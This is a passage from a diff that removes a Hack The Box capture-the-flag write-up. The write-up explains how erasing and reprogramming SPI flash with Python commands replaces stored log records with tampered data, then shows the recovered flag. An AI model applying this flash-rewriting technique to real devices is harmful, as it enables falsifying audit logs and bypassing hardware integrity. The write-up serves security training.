-> while data is being sent to the device. The Page Program instruction sequence is shown in Figure 29.
-> If an entire 256 byte page is to be programmed, the last address byte (the 8 least significant address bits)
-> should be set to 0. If the last address byte is not zero, and the number of clocks exceeds the remaining
-> page length, the addressing will wrap to the beginning of the page. In some cases, less than 256 bytes (a
-> partial page) can be programmed without having any effect on other bytes within the same page. One
-> condition to perform a partial page program is that the number of clocks cannot exceed the remaining
-> page length. If more than 256 bytes are sent to the device the addressing will wrap to the beginning of the
-> page and overwrite previously sent data.
-
-So there are two restrictions we need to keep in mind. We can only write to before `erased` memory and then we can write in `256 byte blocks` max. As it turns out the smallest unit of memory that can be erased is a sector (which is 4K-bytes).
-
-> 8.2.17 Sector Erase (20h)
-> The Sector Erase instruction sets all memory within a specified sector (4K-bytes) to the erased state of all
-> 1s (FFh). A Write Enable instruction must be executed before the device will accept the Sector Erase
-> Instruction (Status Register bit WEL must equal 1). The instruction is initiated by driving the /CS pin low
-> and shifting the instruction code “20h” followed a 24-bit sector address (A23-A0). The Sector Erase
-> instruction sequence is shown in Figure 31a & 31b.
-
-So the plan is to erase the first sector, then split the log-records-set into 256 byte chunks and write them back, and then, hopefully, win the flag. To do write operations the `write enable bit` needs to be set *before every write operation*, so we add a few more operations to our client:
-
-```python
-def flash_wait_busy():
-    while True:
-        status = exchange([0x05], 1)[0]
-        if status & 1 == 0:
-            break
-
-def flash_write_enable():
-    res = exchange([0x06], 1)
-
-def flash_sector_erase(addr):
-    flash_write_enable()
-
-    cmd = [0] * 4
-    cmd[0] = 0x20
-    cmd[1] = (addr >> 16) & 0xff
-    cmd[2] = (addr >> 8)  & 0xff
-    cmd[3] = (addr >> 0)  & 0xff
-
-    exchange(cmd, 1)
-    flash_wait_busy()
-
-def write_data(data, addr):
-    flash_write_enable()
-
-    cmd = [0] * 4
-    cmd[0] = 0x02
-    cmd[1] = (addr >> 16) & 0xff
-    cmd[2] = (addr >> 8)  & 0xff
-    cmd[3] = (addr >> 0)  & 0xff
-
-    for b in data:
-        cmd.append(b)
-
-    exchange(cmd, len(data))
-
-    flash_wait_busy()
-
-if __name__ == "__main__":
-  ...
-
-  # erase first sector (4k memory)
-  flash_sector_erase(0)
-
-  # write modified data back to sector. writes need to happen in
-  # 256 block granularity
-  block_size = 16*16
-  for i in range(0, RECORDS_SIZE//block_size):
-      offset = i*block_size
-      write_data(records[offset:offset+block_size], offset)
-```
-
-Running this will update the full log with our tampered data. But where is the flag? If we scroll up in `client.py` we see one line `FLAG_ADDRESS = [0x52, 0x52, 0x52]`. Does this mean, the flag gets written to address `0x525252` when the log was updated successfully? Lets test this:
-
-```python
-if __name__ == "__main__":
-  ...
-  # read flag
-  addr = (FLAG_ADDRESS[0] << 16) | (FLAG_ADDRESS[1] << 8) | FLAG_ADDRESS[2]
-  flag = read_data(100, addr)
-  print(flag.strip(b"\xff").decode())
-```
-
-```bash
-$ python client.py
-[0000]: 1706207934, 005, 023F, 1, 1, 175DD498
-[0016]: 1706262045, 249, 036F, 2, 1, C3EECDDB
-[0032]: 1706322958, 108, 001C, 3, 1, B9E44CEB
-[0048]: 1706325696, 005, 03B8, 2, 1, FE1D2E77
-...
-HTB{n07h1n9_15_53cu23_w17h_phy51c41_4cc355!@}
-```
-
-The full source of [`client.py can be found here`](client.py).
-
-Flag `HTB{n07h1n9_15_53cu23_w17h_phy51c41_4cc355!@}`
+https://libc.blukat.me/
